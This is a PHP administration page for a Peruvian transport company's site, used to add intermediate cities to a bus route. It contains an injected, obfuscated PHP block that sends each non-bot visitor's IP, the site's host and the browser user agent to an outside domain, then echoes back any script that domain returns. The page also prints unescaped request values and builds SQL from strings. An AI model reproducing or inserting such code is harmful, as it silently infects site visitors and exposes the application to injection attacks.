<?php	
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}
	else if(!(isset($_GET["origen"]) && isset($_GET["destino"]) && isset($_GET["clave"])))
	{
		header("Location: administrador.php");
	}
	
	//Manejar op
	require("../conexion/config.php");
	require("../conexion/baseDatos.php");
	require("../conexion/ajax.php");
	
	$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
	$bd->conectar();
	
	$origen = $_GET["origen"];
	$destino = $_GET["destino"];
	$clave = $_GET["clave"];
?>
<script language="javascript" type="text/javascript">
	var cont=0;
	
	function agregarCiudadR()
	{
		agregarCargando('cargando');
		
		depart = document.getElementById('listDepartamentoO').value;
		prov = document.getElementById('listProvinciaO').value;
		dist = document.getElementById('listDistritoO').value;
		clave = document.getElementById('clave').value;
				
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=ciudadRuta&clave=" + clave + "&depart=" + depart + "&prov=" + prov + "&dist=" + dist;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					actualizarCiudadRuta(resp);
					alert("¡ Ciudad agregada satisfactoriamenmte a la ruta !");
					quitarCargando('cargando');
				}
			}
		}
	}
	
	function actualizarCiudadRuta(ciudad)
	{
		if(cont>0)
		{
			document.getElementById('rutaCompleta').innerHTML = document.getElementById('rutaCompleta').innerHTML + "<br>" + ciudad;			
		}
		else
		{
			document.getElementById('rutaCompleta').innerHTML = document.getElementById('rutaCompleta').innerHTML + ciudad;		
		}
		cont++;
	}

	function go()
	{
		location.href = "administrador.php";	
	}
	
	function onLoadDistritosO()
	{
		manejo(2, document.getElementById("listProvinciaO"), 1);
	}
	
	function agregarProvincias1(dxs)
	{
		dxs = "<select name=\"listProvinciaO\" onchange= \"manejo(2,this,1)\"  id=\"listProvinciaO\">"+dxs+"</select>";
		document.getElementById('OProv').innerHTML=dxs; 		
	}
			
	function agregarDistritos1(dxs)
	{
		dxs = "<select name=\"listDistritoO\" id=\"listDistritoO\">"+dxs+"</select>";
		document.getElementById('ODist').innerHTML=dxs;
	}

	
	function manejo(tipo, obj, lugar)
	{
	  	 agregarCargando('cargando');
	   
		_obj = crearObjeto();
		var dato = obj[obj.selectedIndex].value;
		_op = "&op=ciudad";
		//window.alert(dato);
		switch(tipo)
		{
			//Departamento
			case 1 :	_valores = "departamento="+dato; 
						break;
		
			//Provincia
			case 2 :	_valores = "provincia="+dato;
						break;
		}		
		_url = "ajaxManejador.php?";
		_obj.open("GET",_url+_valores+_op,true);
		_obj.onreadystatechange=function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					//resp = _obj.responseXML;

					switch(lugar)
					{
						case 1 :	//window.alert(" Lugar de nacimiento 1 (Servidor): " + resp);		
									if(tipo==1) //Si envie el departamento, entonces...
									{
										agregarProvincias1(resp);		
										onLoadDistritosO();	
									}
									else //Si envie la provincia, entonces...
									{
										agregarDistritos1(resp);											
									}									
									break;					
					}	
					 quitarCargando('cargando');
				}
			}
		}
		_obj.send(null);
	}
	
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos -InsCiudadRuta ::</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
-->
</style></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../imagenes/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><form id="form1" name="form1" method="post">
          <table width="481" border="0" align="center">
            <tr>
              <td height="49" colspan="2"><div align="center">
                <p><strong>CIUDADES INTERMEDIAS ENTRE  <br> <?php print($origen." - ".$destino);?></strong></p>
              </div>
                <div align="justify"></div></td>
              <td height="49">&nbsp;</td>
              <td width="159" rowspan="5"><label>
                <div align="center"><em><strong>Ruta Completa</strong></em></div>                
                   
                      <div align="center"><?php print($origen); ?>
<?php
#a83596#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/a83596#
?>                      </div>
                      <div align="center" id="rutaCompleta">
						  <!--<select name="select" size="6">
						  
                          </select>-->
				    </div>
                        </label>
               	        <div align="center"><?php print($destino); ?>                   </div></td>
            </tr>

            <tr>
              <td width="129"><em><strong>Departamento :</strong></em></td>
              <td width="142">
                <div align="justify">
                  <select name="listDepartamentoO" id="listDepartamentoO" onChange="manejo(1,this,1)">
                    <?php
								$consulta = "select distinct Departamento from ciudad;";
								$result = $bd->crearConsulta($consulta);
								$cont0=0;
								while($registro = mysql_fetch_object($result))								
								{
									$departamento[$cont0] = $registro->Departamento;									
									echo "<option value=".$departamento[$cont0].">".$departamento[$cont0]."</option>";
									$cont0++;
								}								
							?>
                  </select>
                  </div></td><td width="51">&nbsp;</td>
              </tr>
            <tr>
              <td height="60"><em><strong>Provincia :</strong></em></td>
              <td><div align="center" id="OProv">
			    <div align="justify">
			      <select name="listProvinciaO" id="listProvinciaO" onChange="manejo(2, this, 1)">
			        <?php
									$consulta = "select distinct provincia from ciudad where Departamento='".$departamento[0]."';";
									$result = $bd->crearConsulta($consulta);
									$cont1 = 0;
									while($registro = mysql_fetch_object($result))
									{
										$provincia[$cont1]=$registro->provincia;
										echo "<option value=".$provincia[$cont1].">".$provincia[$cont1]."</option>";
										$cont1++;
									}		
								?>
			        </select>
			      </div>
              </div></td>
              <td><div align="center" id="cargando"></div></td>
              </tr>
            <tr>
              <td><em><strong>Distrito : </strong></em></td>
              <td><div align="center" id="ODist">
                          <div align="justify">
                            <select name="listDistritoO" id="listDistritoO">
                              <?php						  
								$consulta = "select Distrito from ciudad where Provincia='".$provincia[0]."';";
								$result = $bd->crearConsulta($consulta);
								$cont2 = 0;
								while($registro = mysql_fetch_object($result))
								{
									$distrito[$cont2]=$registro->Distrito;
									echo "<option>".$distrito[$cont2]."</option>";
									$cont2++;
								}
							?>
                            </select>
                          </div>
              </div></td>
              <td>&nbsp;</td>
              </tr>
			  <tr>
			  	<td></td>
				<td></td>
				<td></td>
				<td></td>
				<td></td>
			  </tr>
            <tr>
              <td><label>
                <div align="center">
                  <input type="button" name="Submit2" value="Terminar"  onclick="go()"/>
                  </div>
              </label></td>
              <td><label>
                <div align="center">
                  <input type="button" name="Submit" value="Agregar"  onclick="agregarCiudadR()"/>
				  <input type="hidden" name="op" value="ciudadRuta" />
				  <input type="hidden" name="clave" value="<?php print($clave); ?>"  id="clave"/>
                  </div>
              </label></td>
              <td>&nbsp;</td>
              </tr>
          </table>
                </form>
        </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>
